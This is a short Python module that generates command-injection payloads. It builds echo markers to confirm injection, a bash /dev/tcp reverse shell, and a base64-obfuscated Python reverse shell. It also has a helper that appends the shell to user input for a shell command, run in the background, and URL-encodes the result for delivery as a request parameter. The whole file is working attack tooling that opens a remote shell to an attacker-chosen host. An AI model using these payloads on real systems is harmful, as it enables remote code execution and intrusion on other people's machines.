import base64
from urllib.parse import quote


def injection_echo(marker="PWNED_MARKER"):
    return f"*; echo {marker}"


def injection_echo_with_context(marker="PWNED_MARKER"):
    return f"*; echo {marker}; id; whoami"


def reverse_shell_bash(host, port):
    return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"


def reverse_shell_python(host, port):
    code = (
        "import socket,os,pty;"
        "s=socket.socket();"
        f"s.connect(('{host}',{port}));"
        "os.dup2(s.fileno(),0);"
        "os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);"
        "pty.spawn('/bin/sh')"
    )
    b64 = base64.b64encode(code.encode()).decode()
    return f"python3 -c \"import base64;exec(base64.b64decode('{b64}'))\""


def wrap_for_ls(user_input, cmd):
    return f"{user_input}; {cmd} &"


def build_full_payload(host, port, user_input="*"):
    return wrap_for_ls(user_input, reverse_shell_python(host, port))


def as_url_param(payload):
    return quote(payload, safe="")
